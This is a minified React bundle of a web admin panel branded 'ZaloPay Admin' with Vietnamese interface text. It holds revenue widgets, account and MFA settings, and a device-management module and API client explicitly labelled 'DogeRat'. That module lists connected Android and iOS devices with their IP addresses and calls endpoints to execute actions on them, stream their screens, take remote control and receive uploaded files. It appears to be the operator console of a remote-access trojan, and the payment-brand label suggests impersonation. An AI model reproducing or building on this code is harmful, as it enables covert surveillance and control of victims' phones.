tuần"}),e.jsx("div",{className:"space-y-2",children:b.trends.weekly.slice(-4).map(h=>e.jsxs("div",{className:"flex justify-between text-sm",children:[e.jsx("span",{children:h.week}),e.jsxs("span",{className:"font-medium",children:[p(h.revenue)," (",h.transactions," GD)"]})]},h.week))})]}),e.jsxs("div",{children:[e.jsx("h4",{className:"font-medium mb-3",children:"Theo tháng"}),e.jsx("div",{className:"space-y-2",children:b.trends.monthly.slice(-3).map(h=>e.jsxs("div",{className:"flex justify-between text-sm",children:[e.jsx("span",{children:h.month}),e.jsxs("span",{className:"font-medium",children:[p(h.revenue)," (",h.transactions," GD)"]})]},h.month))})]})]})})]}):null]})]})};function Si(){const[n,t]=d.useState(null),[s,a]=d.useState(!0),[r,i]=d.useState(!1),[c,x]=d.useState(null),[l,y]=d.useState(null),[f,b]=d.useState(!1),[o,p]=d.useState(""),[g,h]=d.useState(""),[m,B]=d.useState(""),[P,S]=d.useState(""),[O,V]=d.useState(!1),[v,I]=d.useState(!0),[u,D]=d.useState(!1);d.useEffect(()=>{z()},[]);const z=async()=>{try{const U=await Q.getCurrentUser();U&&(t(U),p(U.email||""))}catch{x("Không thể tải thông tin người dùng")}finally{a(!1)}},G=async U=>{U.preventDefault(),i(!0),x(null),y(null);try{if(!(await Q.apiRequest("/admin/auth/update-profile",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:o})})).ok)throw new Error("Cập nhật thông tin thất bại");y("Cập nhật thông tin thành công"),await z()}catch(J){const q=J instanceof Error?J.message:"Lỗi cập nhật thông tin";x(q),typeof q=="string"&&(q.includes("HTTP 404")||q.includes("HTTP 405")||q.includes("HTTP 501"))&&b(!0)}finally{i(!1)}},j=async U=>{if(U.preventDefault(),m!==P){x("Mật khẩu xác nhận không khớp");return}if(m.length<6){x("Mật khẩu mới phải có ít nhất 6 ký tự");return}i(!0),x(null),y(null);try{if(!(await Q.apiRequest("/admin/auth/change-password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({current_password:g,new_password:m})})).ok)throw new Error("Đổi mật khẩu thất bại");y("Đổi mật khẩu thành công"),h(""),B(""),S("")}catch(J){const q=J instanceof Error?J.message:"Lỗi đổi mật khẩu";x(q),typeof q=="string"&&(q.includes("HTTP 404")||q.includes("HTTP 405")||q.includes("HTTP 501"))&&b(!0)}finally{i(!1)}},W=U=>new Date(U).toLocaleString("vi-VN");return s?e.jsx("div",{className:"flex items-center justify-center h-64",children:e.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"})}):e.jsxs("div",{className:"p-6 space-y-6",children:[f&&e.jsxs("div",{className:"bg-yellow-50 border border-yellow-200 rounded-lg p-4",children:[e.jsx("p",{className:"text-yellow-800 font-medium",children:"Một số chức năng chưa khả dụng"}),e.jsx("p",{className:"text-yellow-700 text-sm mt-1",children:"Backend hiện chưa cung cấp endpoints /admin/auth/update-profile hoặc /admin/auth/change-password. Các nút lưu đã được vô hiệu hoá."})]}),e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Cài đặt tài khoản"}),e.jsx("p",{className:"text-gray-600",children:"Quản lý thông tin tài khoản và cài đặt bảo mật"})]}),c&&e.jsx("div",{className:"bg-red-50 border border-red-200 rounded-lg p-4",children:e.jsx("p",{className:"text-red-600",children:c})}),l&&e.jsx("div",{className:"bg-green-50 border border-green-200 rounded-lg p-4",children:e.jsx("p",{className:"text-green-600",children:l})}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(_e,{className:"h-5 w-5"}),"Thông tin tài khoản"]})}),e.jsx(_,{children:e.jsxs("form",{onSubmit:G,className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Tên đăng nhập"}),e.jsx(se,{value:(n==null?void 0:n.username)||"",disabled:!0,className:"bg-gray-50"}),e.jsx("p",{className:"text-xs text-gray-500 mt-1",children:"Tên đăng nhập không thể thay đổi"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Email"}),e.jsx(se,{type:"email",value:o,onChange:U=>p(U.target.value),placeholder:"admin@zalopay.vn"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Quyền hạn"}),e.jsx($,{variant:n!=null&&n.is_superuser?"default":"secondary",children:n!=null&&n.is_superuser?"Super Admin":"Admin"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Ngày tạo tài khoản"}),e.jsx("p",{className:"text-sm font-medium text-gray-900",children:n!=null&&n.created_at?W(n.created_at):"Chưa có thông tin"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Đăng nhập lần cuối"}),e.jsx("p",{className:"text-sm font-medium text-gray-900",children:n!=null&&n.last_login?W(n.last_login):"Chưa có thông tin"})]}),e.jsxs(C,{type:"submit",disabled:r||f,className:"w-full",children:[e.jsx(Na,{className:"h-4 w-4 mr-2"}),r?"Đang lưu...":"Lưu thông tin"]})]})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(bs,{className:"h-5 w-5"}),"Đổi mật khẩu"]})}),e.jsx(_,{children:e.jsxs("form",{onSubmit:j,className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Mật khẩu hiện tại"}),e.jsxs("div",{className:"relative",children:[e.jsx(se,{type:O?"text":"password",value:g,onChange:U=>h(U.target.value),placeholder:"Nhập mật khẩu hiện tại",required:!0}),e.jsx(C,{type:"button",variant:"ghost",size:"icon",className:"absolute right-2 top-1/2 transform -translate-y-1/2",onClick:()=>V(!O),children:O?e.jsx(cn,{className:"h-4 w-4"}):e.jsx($e,{className:"h-4 w-4"})})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Mật khẩu mới"}),e.jsx(se,{type:O?"text":"password",value:m,onChange:U=>B(U.target.value),placeholder:"Nhập mật khẩu mới",required:!0,minLength:6})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Xác nhận mật khẩu mới"}),e.jsx(se,{type:O?"text":"password",value:P,onChange:U=>S(U.target.value),placeholder:"Nhập lại mật khẩu mới",required:!0,minLength:6})]}),e.jsxs("div",{className:"text-xs text-gray-500",children:[e.jsx("p",{children:"• Mật khẩu phải có ít nhất 6 ký tự"}),e.jsx("p",{children:"• Nên sử dụng kết hợp chữ cái, số và ký tự đặc biệt"})]}),e.jsxs(C,{type:"submit",disabled:r||f,className:"w-full",children:[e.jsx(bs,{className:"h-4 w-4 mr-2"}),r?"Đang cập nhật...":"Đổi mật khẩu"]})]})})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(Ft,{className:"h-5 w-5"}),"Cài đặt thông báo"]})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-700",children:"Thông báo email"}),e.jsx("p",{className:"text-xs text-gray-500",children:"Nhận thông báo qua email khi có hoạt động mới"})]}),e.jsx(C,{variant:"outline",size:"sm",onClick:()=>I(!v),className:v?"bg-green-50 text-green-700":"",children:v?"Bật":"Tắt"})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-700",children:"Thông báo trình duyệt"}),e.jsx("p",{className:"text-xs text-gray-500",children:"Hiển thị thông báo trên trình duyệt"})]}),e.jsx(C,{variant:"outline",size:"sm",onClick:()=>D(!u),className:u?"bg-green-50 text-green-700":"",children:u?"Bật":"Tắt"})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(Je,{className:"h-5 w-5"}),"Bảo mật"]})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-700",children:"Xác thực hai yếu tố"}),e.jsx("p",{className:"text-xs text-gray-500",children:"Bảo vệ tài khoản với lớp bảo mật bổ sung"})]}),e.jsx($,{variant:"outline",children:"Sắp có"})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-700",children:"Phiên đăng nhập"}),e.jsx("p",{className:"text-xs text-gray-500",children:"Quản lý các phiên đăng nhập hoạt động"})]}),e.jsxs(C,{variant:"outline",size:"sm",disabled:!0,children:[e.jsx(Ce,{className:"h-4 w-4 mr-1"}),"Xem"]})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-700",children:"Mã hóa dữ liệu"}),e.jsx("p",{className:"text-xs text-gray-500",children:"Dữ liệu được mã hóa khi lưu trữ"})]}),e.jsx($,{variant:"secondary",className:"bg-green-100 text-green-800",children:"Đã bật"})]})]})]})]})]})}function Ci(){const{toast:n}=Se(),[t,s]=d.useState(!1),[a,r]=d.useState(!1),[i,c]=d.useState(null),[x,l]=d.useState(""),[y,f]=d.useState(!1),[b,o]=d.useState(null);d.useEffect(()=>{p()},[]);const p=async()=>{try{const O=await Q.apiRequest("/admin/auth/mfa/status");r(O.enabled)}catch(O){console.error("Failed to check MFA status:",O)}},g=async()=>{s(!0),o(null);try{const O=await Q.apiRequest("/admin/auth/mfa/setup",{method:"POST"});c(O)}catch(O){o(O instanceof Error?O.message:"Không thể thiết lập MFA"),n({title:"Lỗi",description:"Không thể thiết lập MFA. Vui lòng thử lại.",variant:"destructive"})}finally{s(!1)}},h=async()=>{if(x.length!==6){o("Mã xác thực phải có 6 chữ số");return}f(!0),o(null);try{(await Q.apiRequest("/admin/auth/mfa/verify",{method:"POST",body:JSON.stringify({code:x,secret:i==null?void 0:i.secret})})).success&&(r(!0),c(null),l(""),n({title:"Thành công",description:"MFA đã được kích hoạt thành công."}))}catch(O){o(O instanceof Error?O.message:"Mã xác thực không hợp lệ"),n({title:"Lỗi",description:"Mã xác thực không hợp lệ. Vui lòng thử lại.",variant:"destructive"})}finally{f(!1)}},m=async()=>{if(confirm("Bạn có chắc chắn muốn tắt MFA? Điều này sẽ làm giảm bảo mật tài khoản.")){s(!0);try{await Q.apiRequest("/admin/auth/mfa/disable",{method:"POST"}),r(!1),n({title:"Thành công",description:"MFA đã được tắt."})}catch{n({title:"Lỗi",description:"Không thể tắt MFA. Vui lòng thử lại.",variant:"destructive"})}finally{s(!1)}}},B=async()=>{i!=null&&i.secret&&(await $t(i.secret),n({title:"Đã sao chép",description:"Mã bí mật đã được sao chép vào clipboard."}))},P=async O=>{await $t(O),n({title:"Đã sao chép",description:"Mã dự phòng đã được sao chép."})},S=()=>{if(!(i!=null&&i.backup_codes))return;const O=`Mã dự phòng MFA - ZaloPay Admin

Ngày tạo: ${new Date().toLocaleString("vi-VN")}

Lưu ý: Mỗi mã chỉ sử dụng được một lần.

`+i.backup_codes.map((u,D)=>`${D+1}. ${u}`).join(`
`),V=new Blob([O],{type:"text/plain"}),v=URL.createObjectURL(V),I=document.createElement("a");I.href=v,I.download=`mfa-backup-codes-${new Date().toISOString().split("T")[0]}.txt`,document.body.appendChild(I),I.click(),document.body.removeChild(I),URL.revokeObjectURL(v),n({title:"Đã tải xuống",description:"Mã dự phòng đã được tải xuống."})};return e.jsxs("div",{className:"p-6 space-y-6 max-w-4xl mx-auto",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Xác thực hai yếu tố (MFA)"}),e.jsx("p",{className:"text-gray-600 mt-2",children:"Bảo vệ tài khoản của bạn với lớp bảo mật bổ sung"})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(Je,{className:"h-5 w-5"}),"Trạng thái MFA"]})}),e.jsx(_,{children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:a?"MFA đã được kích hoạt":"MFA chưa được kích hoạt"}),e.jsx("p",{className:"text-sm text-gray-600 mt-1",children:a?"Tài khoản của bạn đang được bảo vệ bằng xác thực hai yếu tố":"Kích hoạt MFA để tăng cường bảo mật cho tài khoản"})]}),e.jsx($,{variant:a?"default":"secondary",className:a?"bg-green-100 text-green-800":"",children:a?e.jsxs(e.Fragment,{children:[e.jsx(ge,{className:"h-4 w-4 mr-1"}),"Đã kích hoạt"]}):e.jsxs(e.Fragment,{children:[e.jsx(Ne,{className:"h-4 w-4 mr-1"}),"Chưa kích hoạt"]})})]})})]}),!a&&!i&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Thiết lập MFA"})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{className:"bg-blue-50 border border-blue-200 rounded-lg p-4",children:[e.jsx("h3",{className:"font-medium text-blue-900 mb-2",children:"Hướng dẫn thiết lập:"}),e.jsxs("ol",{className:"list-decimal list-inside space-y-1 text-sm text-blue-800",children:[e.jsx("li",{children:"Tải ứng dụng xác thực (Google Authenticator, Microsoft Authenticator, hoặc Authy)"}),e.jsx("li",{children:"Quét mã QR hoặc nhập mã bí mật"}),e.jsx("li",{children:"Nhập mã xác thực 6 chữ số để xác nhận"}),e.jsx("li",{children:"Lưu mã dự phòng ở nơi an toàn"})]})]}),e.jsx(C,{onClick:g,disabled:t,className:"w-full",children:t?e.jsxs(e.Fragment,{children:[e.jsx(ye,{className:"h-4 w-4 mr-2 animate-spin"}),"Đang thiết lập..."]}):e.jsxs(e.Fragment,{children:[e.jsx(Je,{className:"h-4 w-4 mr-2"}),"Bắt đầu thiết lập MFA"]})})]})]}),i&&!a&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Hoàn tất thiết lập MFA"})}),e.jsxs(_,{className:"space-y-6",children:[e.jsxs("div",{className:"space-y-2",children:[e.jsx("label",{className:"text-sm font-medium",children:"Quét mã QR:"}),e.jsx("div",{className:"flex justify-center p-4 bg-white border border-gray-200 rounded-lg",children:i.qr_code_url?e.jsx("img",{src:i.qr_code_url,alt:"MFA QR Code",className:"w-48 h-48"}):e.jsx("div",{className:"w-48 h-48 flex items-center justify-center text-gray-400",children:e.jsx(ba,{className:"h-16 w-16"})})})]}),e.jsxs("div",{className:"space-y-2",children:[e.jsx("label",{className:"text-sm font-medium",children:"Hoặc nhập mã bí mật thủ công:"}),e.jsxs("div",{className:"flex gap-2",children:[e.jsx(se,{value:i.secret,readOnly:!0,className:"font-mono"}),e.jsx(C,{variant:"outline",size:"icon",onClick:B,children:e.jsx(Vt,{className:"h-4 w-4"})})]})]}),e.jsxs("div",{className:"space-y-2",children:[e.jsx("label",{className:"text-sm font-medium",children:"Nhập mã xác thực 6 chữ số để xác nhận:"}),e.jsx(Ht,{value:x,onChange:l,disabled:y,error:b||void 0,onComplete:h})]}),b&&e.jsx("div",{className:"bg-red-50 border border-red-200 rounded-lg p-3",children:e.jsx("p",{className:"text-sm text-red-600",children:b})}),e.jsx(C,{onClick:h,disabled:y||x.length!==6,className:"w-full",children:y?e.jsxs(e.Fragment,{children:[e.jsx(ye,{className:"h-4 w-4 mr-2 animate-spin"}),"Đang xác thực..."]}):e.jsxs(e.Fragment,{children:[e.jsx(ge,{className:"h-4 w-4 mr-2"}),"Xác nhận và kích hoạt MFA"]})})]})]}),(i==null?void 0:i.backup_codes)&&i.backup_codes.length>0&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Mã dự phòng"})}),e.jsxs(_,{className:"space-y-4",children:[e.jsx("div",{className:"bg-yellow-50 border border-yellow-200 rounded-lg p-4",children:e.jsxs("p",{className:"text-sm text-yellow-800",children:[e.jsx("strong",{children:"Lưu ý quan trọng:"})," Lưu các mã này ở nơi an toàn. Mỗi mã chỉ sử dụng được một lần. Nếu bạn mất quyền truy cập vào ứng dụng xác thực, bạn có thể sử dụng các mã này để đăng nhập."]})}),e.jsx("div",{className:"grid grid-cols-2 gap-2",children:i.backup_codes.map((O,V)=>e.jsxs("div",{className:"flex items-center justify-between p-3 bg-gray-50 rounded-lg border border-gray-200",children:[e.jsx("span",{className:"font-mono text-sm",children:O}),e.jsx(C,{variant:"ghost",size:"icon",onClick:()=>P(O),children:e.jsx(Vt,{className:"h-4 w-4"})})]},V))}),e.jsxs(C,{variant:"outline",onClick:S,className:"w-full",children:[e.jsx(Ee,{className:"h-4 w-4 mr-2"}),"Tải xuống mã dự phòng"]})]})]}),a&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Quản lý MFA"})}),e.jsx(_,{children:e.jsx(C,{variant:"destructive",onClick:m,disabled:t,children:t?e.jsxs(e.Fragment,{children:[e.jsx(ye,{className:"h-4 w-4 mr-2 animate-spin"}),"Đang xử lý..."]}):e.jsxs(e.Fragment,{children:[e.jsx(Ne,{className:"h-4 w-4 mr-2"}),"Tắt MFA"]})})})]})]})}const Ti="/api/v1";class Ai{async request(t,s={}){var x;const a=localStorage.getItem("zalopay_admin_token"),r=new Headers(s.headers);r.set("Content-Type","application/json"),a&&r.set("Authorization",`Bearer ${a}`);const i=await fetch(`${Ti}${t}`,{...s,headers:r});if(!i.ok){const l=await i.json().catch(()=>({error:"Unknown error"}));throw new Error(((x=l.error)==null?void 0:x.message)||l.error||"Request failed")}const c=await i.json();return c.data||c}async getDevices(t){const s=new URLSearchParams;t!=null&&t.platform&&s.append("platform",t.platform),(t==null?void 0:t.online)!==void 0&&s.append("online",String(t.online));const a=s.toString(),r=`/devices${a?`?${a}`:""}`,i=await this.request(r);return i&&"data"in i?i.data:Array.isArray(i)?i:[]}async getDeviceById(t){const s=await this.request(`/devices/${t}`);return s&&"data"in s?s.data:s}async getAvailableActions(t){const s=t?`?platform=${t}`:"",a=await this.request(`/actions${s}`);return a&&"data"in a?a.data:Array.isArray(a)?a:[]}async executeAction(t,s,a){return this.request(`/devices/${t}/action`,{method:"POST",body:JSON.stringify({action:s,params:a})})}async startScreenStream(t,s){return this.request(`/devices/${t}/screen/start`,{method:"POST",body:JSON.stringify({quality:s})})}async stopScreenStream(t){return this.request(`/devices/${t}/screen/stop`,{method:"POST"})}async updateScreenQuality(t,s){return this.request(`/devices/${t}/screen/quality`,{method:"POST",body:JSON.stringify(s)})}async getScreenStatus(t){return this.request(`/devices/${t}/screen/status`)}async startRemoteControl(t){return this.request(`/devices/${t}/control/start`,{method:"POST"})}async stopRemoteControl(t){return this.request(`/devices/${t}/control/stop`,{method:"POST"})}async sendControlCommand(t,s){return this.request(`/devices/${t}/control/command`,{method:"POST",body:JSON.stringify(s)})}async getControlStatus(t){return this.request(`/devices/${t}/control/status`)}}const we=new Ai,Ei=window.location.origin;function Et(n={}){const{onDeviceConnected:t,onDeviceDisconnected:s,onDeviceDataUpdate:a,onScreenFrame:r,onControlResponse:i,onActionResponse:c,onFileUploaded:x,enabled:l=!0}=n,[y,f]=d.useState(!1),b=d.useRef(null);d.useEffect(()=>{if(!l)return;const p=ct(Ei,{transports:["websocket","polling"],reconnection:!0,reconnectionAttempts:5,reconnectionDelay:1e3});return b.current=p,p.on("connect",()=>{console.log("DogeRat Socket.IO connected"),f(!0)}),p.on("disconnect",()=>{console.log("DogeRat Socket.IO disconnected"),f(!1)}),p.on("connect_error",g=>{console.error("DogeRat Socket.IO connection error:",g),f(!1)}),p.on("device-connected",g=>{console.log("Device connected:",g),t==null||t(g)}),p.on("device-disconnected",g=>{console.log("Device disconnected:",g),s==null||s(g)}),p.on("device-data-update",g=>{console.log("Device data update:",g),a==null||a(g)}),p.on("screen-frame",g=>{r==null||r(g)}),p.on("control-response",g=>{i==null||i(g)}),p.on("action-response",g=>{c==null||c(g)}),p.on("file-uploaded",g=>{x==null||x(g)}),()=>{p.disconnect(),b.current=null}},[l,t,s,a,r,i,c,x]);const o=d.useCallback((p,g)=>{var h;(h=b.current)!=null&&h.connected&&b.current.emit(p,g)},[]);return{isConnected:y,socket:b.current,emit:o}}function Zt({status:n,platform:t,className:s}){return e.jsxs("div",{className:Z("flex items-center gap-2",s),children:[e.jsx("div",{className:Z("w-2 h-2 rounded-full",n==="online"?"bg-green-500":"bg-gray-400",n==="online"&&"animate-pulse")}),e.jsx("span",{className:Z("text-sm font-medium",n==="online"?"text-green-700":"text-gray-500"),children:n==="online"?"Online":"Offline"}),t&&e.jsx("span",{className:Z("px-2 py-0.5 rounded text-xs font-medium",t==="ios"?"bg-blue-100 text-blue-700":"bg-green-100 text-green-700"),children:t==="ios"?"🍎 iOS":"🤖 Android"})]})}function Ri(){const[,n]=Xe(),t=qe(),[s,a]=d.useState("all"),[r,i]=d.useState("all"),[c,x]=d.useState(""),[l,y]=d.useState("last_seen"),[f,b]=d.useState("desc"),o=d.useMemo(()=>{const v={};return s!=="all"&&(v.platform=s),r!=="all"&&(v.online=r==="online"),v},[s,r]),{data:p,isLoading:g,error:h,refetch:m}=me({queryKey:["devices",o],queryFn:()=>we.getDevices(o),refetchInterval:!1}),B=p||[],{isConnected:P}=di({onDeviceConnected:v=>{t.setQueryData(["devices",o],I=>{if(!I)return I;const u=v.device||v,D=I.findIndex(z=>z.id===u.id);if(D>=0){const z=[...I];return z[D]={...z[D],...u,status:"online",online:!0,last_seen:new Date().toISOString()},z}else return[{id:u.id,device_id:u.id,model:u.model,version:u.version,platform:u.platform||"android",platform_version:u.platformVersion,ip_address:u.ip,status:"online",online:!0,connected_at:u.connectedAt||new Date().toISOString(),last_seen:new Date().toISOString()},...I]})},onDeviceDisconnected:v=>{t.setQueryData(["devices",o],I=>{if(!I)return I;const u=v.device||v;return I.map(D=>D.id===u.id?{...D,status:"offline",online:!1,last_seen:new Date().toISOString()}:D)})},onDeviceStatusChanged:v=>{t.setQueryData(["devices",o],I=>{if(!I)return I;const u=v.device||{};return I.map(D=>D.id===v.deviceId?{...D,status:v.newStatus==="online"?"online":"offline",online:v.newStatus==="online",last_seen:new Date().toISOString(),...u}:D)})},onDeviceDataReceived:v=>{t.setQueryData(["devices",o],I=>I&&I.map(u=>u.id===v.deviceId?{...u,last_seen:new Date().toISOString(),status:"online",online:!0}:u))}});Et({onDeviceConnected:v=>{t.invalidateQueries({queryKey:["devices"]})},onDeviceDisconnected:v=>{t.setQueryData(["devices",o],I=>I&&I.map(u=>u.id===v.id?{...u,status:"offline"}:u))},onDeviceDataUpdate:()=>{t.invalidateQueries({queryKey:["devices"]})}});const S=d.useMemo(()=>{let v=[...B];if(c){const I=c.toLowerCase();v=v.filter(u=>{var D,z,G,j;return((D=u.model)==null?void 0:D.toLowerCase().includes(I))||((z=u.device_id)==null?void 0:z.toLowerCase().includes(I))||((G=u.ip_address)==null?void 0:G.toLowerCase().includes(I))||((j=u.version)==null?void 0:j.toLowerCase().includes(I))})}return v.sort((I,u)=>{let D,z;switch(l){case"last_seen":D=new Date(I.last_seen).getTime(),z=new Date(u.last_seen).getTime();break;case"connected_at":D=new Date(I.connected_at).getTime(),z=new Date(u.connected_at).getTime();break;case"model":D=I.model||"",z=u.model||"";break;default:return 0}return l==="model"?f==="asc"?D.localeCompare(z):z.localeCompare(D):f==="asc"?D-z:z-D}),v},[B,c,l,f]),O=v=>new Date(v).toLocaleString("vi-VN",{year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit"}),V=v=>{const I=new Date,u=new Date(v),D=I.getTime()-u.getTime(),z=Math.floor(D/(1e3*60*60)),G=Math.floor(D%(1e3*60*60)/(1e3*60));return z>0?`${z}h ${G}m`:`${G}m`};return h?e.jsx("div",{className:"p-6",children:e.jsxs("div",{className:"bg-red-50 border border-red-200 rounded-lg p-4",children:[e.jsxs("p",{className:"text-red-800",children:["Error loading devices: ",h instanceof Error?h.message:"Unknown error"]}),e.jsx(C,{onClick:()=>m(),className:"mt-2",children:"Retry"})]})}):e.jsxs("div",{className:"p-6",children:[e.jsxs("div",{className:"flex items-center justify-between mb-6",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Device Management"}),e.jsx("p",{className:"text-sm text-gray-600 mt-1",children:"Manage and monitor devices connected via DogeRat API"})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"flex items-center gap-2",children:P?e.jsxs($,{variant:"outline",className:"bg-green-50 text-green-700 border-green-200",children:[e.jsx(is,{className:"h-3 w-3 mr-1"}),"Real-time"]}):e.jsxs($,{variant:"outline",className:"bg-gray-50 text-gray-600 border-gray-200",children:[e.jsx(rs,{className:"h-3 w-3 mr-1"}),"Offline"]})}),e.jsx(Zt,{status:"online"}),e.jsxs("span",{className:"text-sm text-gray-600",children:[S.length," device",S.length!==1?"s":""]})]})]}),e.jsx("div",{className:"bg-white rounded-lg shadow-sm border border-gray-200 p-4 mb-6",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-4",children:[e.jsxs("div",{className:"relative",children:[e.jsx(He,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),e.jsx(se,{placeholder:"Search devices...",value:c,onChange:v=>x(v.target.value),className:"pl-10"})]}),e.jsxs(ce,{value:s,onValueChange:v=>a(v),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"All Platforms"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"All Platforms"}),e.jsx(R,{value:"android",children:"Android"}),e.jsx(R,{value:"ios",children:"iOS"})]})]}),e.jsxs(ce,{value:r,onValueChange:v=>i(v),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"All Status"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"All Status"}),e.jsx(R,{value:"online",children:"Online"}),e.jsx(R,{value:"offline",children:"Offline"})]})]}),e.jsxs(ce,{value:`${l}-${f}`,onValueChange:v=>{const[I,u]=v.split("-");y(I),b(u)},children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Sort by"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"last_seen-desc",children:"Last Seen (Newest)"}),e.jsx(R,{value:"last_seen-asc",children:"Last Seen (Oldest)"}),e.jsx(R,{value:"connected_at-desc",children:"Connected (Newest)"}),e.jsx(R,{value:"connected_at-asc",children:"Connected (Oldest)"}),e.jsx(R,{value:"model-asc",children:"Model (A-Z)"}),e.jsx(R,{value:"model-desc",children:"Model (Z-A)"})]})]})]})}),g?e.jsx("div",{className:"flex items-center justify-center py-12",children:e.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"})}):S.length===0?e.jsxs("div",{className:"bg-white rounded-lg shadow-sm border border-gray-200 p-12 text-center",children:[e.jsx(Ct,{className:"h-12 w-12 text-gray-400 mx-auto mb-4"}),e.jsx("p",{className:"text-gray-600",children:"No devices found"}),c||s!=="all"||r!=="all"?e.jsx("p",{className:"text-sm text-gray-500 mt-2",children:"Try adjusting your filters"}):e.jsx("p",{className:"text-sm text-gray-500 mt-2",children:"Devices will appear here when connected"})]}):e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4",children:S.map(v=>{var I,u;return e.jsxs("div",{className:"bg-white rounded-lg shadow-sm border border-gray-200 p-5 cursor-pointer hover:shadow-md transition-shadow",onClick:()=>n(`/devices/${v.id}`),children:[e.jsxs("div",{className:"flex items-start justify-between mb-3",children:[e.jsxs("div",{className:"flex-1",children:[e.jsx("h3",{className:"font-semibold text-gray-900 mb-1",children:v.model||v.device_id||"Unknown Device"}),e.jsxs("p",{className:"text-xs text-gray-500 font-mono",children:[(I=v.device_id)==null?void 0:I.substring(0,12),"..."]})]}),e.jsx(Zt,{status:v.status,platform:v.platform})]}),e.jsxs("div",{className:"space-y-2 text-sm",children:[e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-600",children:"Platform:"}),e.jsxs("span",{className:"font-medium",children:[((u=v.platform)==null?void 0:u.toUpperCase())||"N/A",v.platform_version&&` ${v.platform_version}`]})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-600",children:"Version:"}),e.jsx("span",{className:"font-medium",children:v.version||"N/A"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-600",children:"IP Address:"}),e.jsx("span",{className:"font-medium font-mono text-xs",children:v.ip_address||"N/A"})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-600",children:"Connected:"}),e.jsx("span",{className:"font-medium",children:O(v.connected_at)})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-600",children:"Duration:"}),e.jsx("span",{className:"font-medium",children:V(v.connected_at)})]}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("span",{className:"text-gray-600",children:"Last Seen:"}),e.jsx("span",{className:"font-medium",children:O(v.last_seen)})]})]}),e.jsx("div",{className:"mt-4 pt-4 border-t border-gray-200",children:e.jsx(C,{variant:"outline",size:"sm",className:"w-full",onClick:D=>{D.stopPropagation(),n(`/devices/${v.id}`)},children:"View Details"})})]},v.id)})})]})}function Oi({deviceId:n,platform:t}){const 